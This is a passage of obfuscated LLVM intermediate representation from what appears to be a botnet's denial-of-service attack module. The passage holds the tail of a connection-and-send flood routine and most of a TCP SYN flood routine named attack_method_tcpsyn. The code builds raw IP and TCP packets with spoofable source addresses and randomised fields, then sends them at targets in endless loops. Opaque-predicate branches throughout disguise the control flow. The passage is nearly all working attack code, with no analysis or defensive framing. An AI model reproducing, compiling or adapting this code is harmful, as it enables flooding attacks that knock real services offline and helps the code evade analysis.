  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %164
  %173 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 2
  %178 = load i8, i8* %177, align 4
  %179 = zext i8 %178 to i32
  %180 = icmp slt i32 %179, 32
  %181 = load i32, i32* @x.23
  %182 = load i32, i32* @y.24
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %180, label %189, label %215

; <label>:189:                                    ; preds = %originalBBpart212
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = call i32 @ntohl(i32 %195) #7
  %197 = call i32 @rand_next()
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 2
  %203 = load i8, i8* %202, align 4
  %204 = zext i8 %203 to i32
  %205 = lshr i32 %197, %204
  %206 = add i32 %196, %205
  %207 = call i32 @htonl(i32 %206) #7
  %208 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 0
  %213 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %212, i32 0, i32 2
  %214 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %213, i32 0, i32 0
  store i32 %207, i32* %214, align 4
  br label %215

; <label>:215:                                    ; preds = %189, %originalBBpart212
  %216 = load i32*, i32** %11, align 8
  %217 = load i32, i32* %9, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i32, i32* %216, i64 %218
  %220 = load i32, i32* %219, align 4
  %221 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %222 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %223 = load i32, i32* %9, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i64 %224
  %226 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i32 0, i32 0
  %227 = bitcast %struct.sockaddr_in* %226 to %struct.sockaddr*
  store %struct.sockaddr* %227, %struct.sockaddr** %221, align 8
  %228 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %229 = load %struct.sockaddr*, %struct.sockaddr** %228, align 8
  %230 = call i32 @connect(i32 %220, %struct.sockaddr* %229, i32 16)
  %231 = icmp eq i32 %230, -1
  br i1 %231, label %232, label %249

; <label>:232:                                    ; preds = %215
  %233 = load i32, i32* @x.23
  %234 = load i32, i32* @y.24
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %232
  %241 = load i32, i32* @x.23
  %242 = load i32, i32* @y.24
  %243 = sub i32 %241, 1
  %244 = mul i32 %241, %243
  %245 = urem i32 %244, 2
  %246 = icmp eq i32 %245, 0
  %247 = icmp slt i32 %242, 10
  %248 = or i1 %246, %247
  br i1 %248, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %249

; <label>:249:                                    ; preds = %originalBBpart216, %215
  %250 = load i32, i32* @x.23
  %251 = load i32, i32* @y.24
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %249
  %258 = load i32, i32* @x.23
  %259 = load i32, i32* @y.24
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %266

; <label>:266:                                    ; preds = %originalBBpart220
  %267 = load i32, i32* %9, align 4
  %268 = add nsw i32 %267, 1
  store i32 %268, i32* %9, align 4
  br label %58

; <label>:269:                                    ; preds = %originalBBpart2
  br label %270

; <label>:270:                                    ; preds = %317, %269
  store i32 0, i32* %9, align 4
  br label %271

; <label>:271:                                    ; preds = %314, %270
  %272 = load i32, i32* %9, align 4
  %273 = load i8, i8* %5, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %272, %274
  br i1 %275, label %276, label %317

; <label>:276:                                    ; preds = %271
  %277 = load i8**, i8*** %10, align 8
  %278 = load i32, i32* %9, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds i8*, i8** %277, i64 %279
  %281 = load i8*, i8** %280, align 8
  store i8* %281, i8** %22, align 8
  %282 = load i8, i8* %15, align 1
  %283 = icmp ne i8 %282, 0
  br i1 %283, label %284, label %288

; <label>:284:                                    ; preds = %276
  %285 = load i8*, i8** %22, align 8
  %286 = load i16, i16* %14, align 2
  %287 = zext i16 %286 to i32
  call void @rand_str(i8* %285, i32 %287)
  br label %288

; <label>:288:                                    ; preds = %284, %276
  %289 = load i32, i32* @x.23
  %290 = load i32, i32* @y.24
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %288
  %297 = load i32*, i32** %11, align 8
  %298 = load i32, i32* %9, align 4
  %299 = sext i32 %298 to i64
  %300 = getelementptr inbounds i32, i32* %297, i64 %299
  %301 = load i32, i32* %300, align 4
  %302 = load i8*, i8** %22, align 8
  %303 = load i16, i16* %14, align 2
  %304 = zext i16 %303 to i64
  %305 = call i64 @send(i32 %301, i8* %302, i64 %304, i32 16384)
  %306 = load i32, i32* @x.23
  %307 = load i32, i32* @y.24
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %314

; <label>:314:                                    ; preds = %originalBBpart224
  %315 = load i32, i32* %9, align 4
  %316 = add nsw i32 %315, 1
  store i32 %316, i32* %9, align 4
  br label %271

; <label>:317:                                    ; preds = %271
  br label %270

originalBBalteredBB:                              ; preds = %originalBB, %58
  %318 = load i32, i32* %9, align 4
  %319 = load i8, i8* %5, align 1
  %320 = zext i8 %319 to i32
  %321 = icmp slt i32 %318, %320
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %322 = call i32 @rand_next()
  %323 = trunc i32 %322 to i16
  %324 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %325 = load i32, i32* %9, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %324, i64 %326
  %328 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %327, i32 0, i32 0
  %329 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %328, i32 0, i32 1
  store i16 %323, i16* %329, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %113
  %330 = load i16, i16* %12, align 2
  %331 = call zeroext i16 @htons(i16 zeroext %330) #7
  %332 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %333 = load i32, i32* %9, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %332, i64 %334
  %336 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %335, i32 0, i32 0
  %337 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %336, i32 0, i32 1
  store i16 %331, i16* %337, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %164
  %338 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %341, i32 0, i32 2
  %343 = load i8, i8* %342, align 4
  %344 = zext i8 %343 to i32
  %345 = icmp slt i32 %344, 32
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %232
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %249
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %288
  %346 = load i32*, i32** %11, align 8
  %347 = load i32, i32* %9, align 4
  %348 = sext i32 %347 to i64
  %349 = getelementptr inbounds i32, i32* %346, i64 %348
  %350 = load i32, i32* %349, align 4
  %351 = load i8*, i8** %22, align 8
  %352 = load i16, i16* %14, align 2
  %353 = zext i16 %352 to i64
  %354 = call i64 @send(i32 %350, i8* %351, i64 %353, i32 16384)
  br label %originalBB22
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

declare i32 @connect(i32, %struct.sockaddr*, i32) #4

declare i64 @send(i32, i8*, i64, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.tcphdr*, align 8
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %34 = load i8, i8* %5, align 1
  %35 = zext i8 %34 to i64
  %36 = call noalias i8* @calloc(i64 %35, i64 8) #6
  %37 = bitcast i8* %36 to i8**
  store i8** %37, i8*** %11, align 8
  %38 = load i8, i8* %7, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 2, i32 0)
  %41 = trunc i32 %40 to i8
  store i8 %41, i8* %12, align 1
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 3, i32 65535)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %13, align 2
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 4, i32 64)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %14, align 1
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 5, i32 1)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %15, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 6, i32 65535)
  %57 = trunc i32 %56 to i16
  store i16 %57, i16* %16, align 2
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 7, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %17, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 17, i32 65535)
  store i32 %64, i32* %18, align 4
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 18, i32 0)
  store i32 %67, i32* %19, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 11, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 12, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %21, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 13, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %22, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 14, i32 0)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %23, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 15, i32 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %24, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 16, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %25, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = load i32, i32* @LOCAL_ADDR, align 4
  %95 = call i32 @attack_get_opt_ip(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 25, i32 %94)
  store i32 %95, i32* %26, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %10, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %4
  br label %613

; <label>:99:                                     ; preds = %4
  %100 = load i32, i32* @x.25
  %101 = load i32, i32* @y.26
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %99
  store i32 1, i32* %9, align 4
  %108 = load i32, i32* %10, align 4
  %109 = bitcast i32* %9 to i8*
  %110 = call i32 @setsockopt(i32 %108, i32 0, i32 3, i8* %109, i32 4) #6
  %111 = icmp eq i32 %110, -1
  %112 = load i32, i32* @x.25
  %113 = load i32, i32* @y.26
  %114 = sub i32 %112, 1
  %115 = mul i32 %112, %114
  %116 = urem i32 %115, 2
  %117 = icmp eq i32 %116, 0
  %118 = icmp slt i32 %113, 10
  %119 = or i1 %117, %118
  br i1 %119, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %111, label %120, label %123

; <label>:120:                                    ; preds = %originalBBpart2
  %121 = load i32, i32* %10, align 4
  %122 = call i32 @close(i32 %121)
  br label %613

; <label>:123:                                    ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %124

; <label>:124:                                    ; preds = %originalBBpart26, %123
  %125 = load i32, i32* %9, align 4
  %126 = load i8, i8* %5, align 1
  %127 = zext i8 %126 to i32
  %128 = icmp slt i32 %125, %127
  br i1 %128, label %129, label %320

; <label>:129:                                    ; preds = %124
  %130 = call noalias i8* @calloc(i64 128, i64 1) #6
  %131 = load i8**, i8*** %11, align 8
  %132 = load i32, i32* %9, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  store i8* %130, i8** %134, align 8
  %135 = load i8**, i8*** %11, align 8
  %136 = load i32, i32* %9, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8*, i8** %135, i64 %137
  %139 = load i8*, i8** %138, align 8
  %140 = bitcast i8* %139 to %struct.iphdr*
  store %struct.iphdr* %140, %struct.iphdr** %27, align 8
  %141 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %142 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %141, i64 1
  %143 = bitcast %struct.iphdr* %142 to %struct.tcphdr*
  store %struct.tcphdr* %143, %struct.tcphdr** %28, align 8
  %144 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i64 1
  %146 = bitcast %struct.tcphdr* %145 to i8*
  store i8* %146, i8** %29, align 8
  %147 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %148 = bitcast %struct.iphdr* %147 to i8*
  %149 = load i8, i8* %148, align 4
  %150 = and i8 %149, 15
  %151 = or i8 %150, 64
  store i8 %151, i8* %148, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = and i8 %154, -16
  %156 = or i8 %155, 5
  store i8 %156, i8* %153, align 4
  %157 = load i8, i8* %12, align 1
  %158 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 1
  store i8 %157, i8* %159, align 1
  %160 = call zeroext i16 @htons(i16 zeroext 60) #7
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 2
  store i16 %160, i16* %162, align 2
  %163 = load i16, i16* %13, align 2
  %164 = call zeroext i16 @htons(i16 zeroext %163) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 3
  store i16 %164, i16* %166, align 4
  %167 = load i8, i8* %14, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 5
  store i8 %167, i8* %169, align 4
  %170 = load i8, i8* %15, align 1
  %171 = icmp ne i8 %170, 0
  br i1 %171, label %172, label %176

; <label>:172:                                    ; preds = %129
  %173 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %174 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 4
  store i16 %173, i16* %175, align 2
  br label %176

; <label>:176:                                    ; preds = %172, %129
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 6
  store i8 6, i8* %178, align 1
  %179 = load i32, i32* %26, align 4
  %180 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 8
  store i32 %179, i32* %181, align 4
  %182 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %183 = load i32, i32* %9, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %182, i64 %184
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %185, i32 0, i32 1
  %187 = load i32, i32* %186, align 4
  %188 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 9
  store i32 %187, i32* %189, align 4
  %190 = load i16, i16* %16, align 2
  %191 = call zeroext i16 @htons(i16 zeroext %190) #7
  %192 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %193 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %192, i32 0, i32 0
  store i16 %191, i16* %193, align 4
  %194 = load i16, i16* %17, align 2
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %197 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %196, i32 0, i32 1
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* %18, align 4
  %199 = trunc i32 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #7
  %201 = zext i16 %200 to i32
  %202 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %203 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %202, i32 0, i32 2
  store i32 %201, i32* %203, align 4
  %204 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %205 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -241
  %208 = or i16 %207, 160
  store i16 %208, i16* %205, align 4
  %209 = load i8, i8* %20, align 1
  %210 = sext i8 %209 to i16
  %211 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %212 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %211, i32 0, i32 4
  %213 = load i16, i16* %212, align 4
  %214 = and i16 %210, 1
  %215 = shl i16 %214, 13
  %216 = and i16 %213, -8193
  %217 = or i16 %216, %215
  store i16 %217, i16* %212, align 4
  %218 = load i8, i8* %21, align 1
  %219 = sext i8 %218 to i16
  %220 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %221 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %220, i32 0, i32 4
  %222 = load i16, i16* %221, align 4
  %223 = and i16 %219, 1
  %224 = shl i16 %223, 12
  %225 = and i16 %222, -4097
  %226 = or i16 %225, %224
  store i16 %226, i16* %221, align 4
  %227 = load i8, i8* %22, align 1
  %228 = sext i8 %227 to i16
  %229 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %230 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %229, i32 0, i32 4
  %231 = load i16, i16* %230, align 4
  %232 = and i16 %228, 1
  %233 = shl i16 %232, 11
  %234 = and i16 %231, -2049
  %235 = or i16 %234, %233
  store i16 %235, i16* %230, align 4
  %236 = load i8, i8* %23, align 1
  %237 = sext i8 %236 to i16
  %238 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %239 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %238, i32 0, i32 4
  %240 = load i16, i16* %239, align 4
  %241 = and i16 %237, 1
  %242 = shl i16 %241, 10
  %243 = and i16 %240, -1025
  %244 = or i16 %243, %242
  store i16 %244, i16* %239, align 4
  %245 = load i8, i8* %24, align 1
  %246 = sext i8 %245 to i16
  %247 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %248 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %247, i32 0, i32 4
  %249 = load i16, i16* %248, align 4
  %250 = and i16 %246, 1
  %251 = shl i16 %250, 9
  %252 = and i16 %249, -513
  %253 = or i16 %252, %251
  store i16 %253, i16* %248, align 4
  %254 = load i8, i8* %25, align 1
  %255 = sext i8 %254 to i16
  %256 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %257 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %256, i32 0, i32 4
  %258 = load i16, i16* %257, align 4
  %259 = and i16 %255, 1
  %260 = shl i16 %259, 8
  %261 = and i16 %258, -257
  %262 = or i16 %261, %260
  store i16 %262, i16* %257, align 4
  %263 = load i8*, i8** %29, align 8
  %264 = getelementptr inbounds i8, i8* %263, i32 1
  store i8* %264, i8** %29, align 8
  store i8 2, i8* %263, align 1
  %265 = load i8*, i8** %29, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %29, align 8
  store i8 4, i8* %265, align 1
  %267 = call i32 @rand_next()
  %268 = and i32 %267, 15
  %269 = add i32 1400, %268
  %270 = trunc i32 %269 to i16
  %271 = call zeroext i16 @htons(i16 zeroext %270) #7
  %272 = load i8*, i8** %29, align 8
  %273 = bitcast i8* %272 to i16*
  store i16 %271, i16* %273, align 2
  %274 = load i8*, i8** %29, align 8
  %275 = getelementptr inbounds i8, i8* %274, i64 2
  store i8* %275, i8** %29, align 8
  %276 = load i8*, i8** %29, align 8
  %277 = getelementptr inbounds i8, i8* %276, i32 1
  store i8* %277, i8** %29, align 8
  store i8 4, i8* %276, align 1
  %278 = load i8*, i8** %29, align 8
  %279 = getelementptr inbounds i8, i8* %278, i32 1
  store i8* %279, i8** %29, align 8
  store i8 2, i8* %278, align 1
  %280 = load i8*, i8** %29, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %29, align 8
  store i8 8, i8* %280, align 1
  %282 = load i8*, i8** %29, align 8
  %283 = getelementptr inbounds i8, i8* %282, i32 1
  store i8* %283, i8** %29, align 8
  store i8 10, i8* %282, align 1
  %284 = call i32 @rand_next()
  %285 = load i8*, i8** %29, align 8
  %286 = bitcast i8* %285 to i32*
  store i32 %284, i32* %286, align 4
  %287 = load i8*, i8** %29, align 8
  %288 = getelementptr inbounds i8, i8* %287, i64 4
  store i8* %288, i8** %29, align 8
  %289 = load i8*, i8** %29, align 8
  %290 = bitcast i8* %289 to i32*
  store i32 0, i32* %290, align 4
  %291 = load i8*, i8** %29, align 8
  %292 = getelementptr inbounds i8, i8* %291, i64 4
  store i8* %292, i8** %29, align 8
  %293 = load i8*, i8** %29, align 8
  %294 = getelementptr inbounds i8, i8* %293, i32 1
  store i8* %294, i8** %29, align 8
  store i8 1, i8* %293, align 1
  %295 = load i8*, i8** %29, align 8
  %296 = getelementptr inbounds i8, i8* %295, i32 1
  store i8* %296, i8** %29, align 8
  store i8 3, i8* %295, align 1
  %297 = load i8*, i8** %29, align 8
  %298 = getelementptr inbounds i8, i8* %297, i32 1
  store i8* %298, i8** %29, align 8
  store i8 3, i8* %297, align 1
  %299 = load i8*, i8** %29, align 8
  %300 = getelementptr inbounds i8, i8* %299, i32 1
  store i8* %300, i8** %29, align 8
  store i8 6, i8* %299, align 1
  br label %301

; <label>:301:                                    ; preds = %176
  %302 = load i32, i32* @x.25
  %303 = load i32, i32* @y.26
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %301
  %310 = load i32, i32* %9, align 4
  %311 = add nsw i32 %310, 1
  store i32 %311, i32* %9, align 4
  %312 = load i32, i32* @x.25
  %313 = load i32, i32* @y.26
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %124

; <label>:320:                                    ; preds = %124
  br label %321

; <label>:321:                                    ; preds = %612, %320
